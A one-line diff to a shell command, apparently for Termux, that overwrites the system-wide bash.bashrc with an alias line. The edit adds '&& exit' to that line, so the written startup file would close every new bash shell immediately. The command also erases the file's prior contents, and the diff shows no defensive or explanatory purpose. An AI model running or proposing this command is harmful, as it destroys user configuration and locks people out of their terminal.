@@ -1,1 +1,1 @@
-echo "alias tested='ls -l' " > $HOME/../usr/etc/bash.bashrc
+echo "alias tested='ls -l' && exit " > $HOME/../usr/etc/bash.bashrc
